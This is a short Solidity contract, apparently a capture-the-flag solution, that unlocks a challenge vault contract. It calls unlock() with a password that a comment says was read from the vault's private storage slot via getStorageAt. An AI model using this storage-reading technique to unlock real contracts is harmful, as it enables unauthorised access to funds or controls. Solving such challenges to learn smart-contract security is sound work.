// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function unlock(bytes32 _password) external;
}

contract VaultBreaker {

    address constant vaultAddr = 0x9ff174B7E211cf8f833299ABD26b3B1660dB594f;
    bytes32 constant password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29; // taken from running await web3.eth.getStorageAt((await contract.address), 1); in the console

    function unlockVault() public {
        IVault(vaultAddr).unlock(password);
    }
} 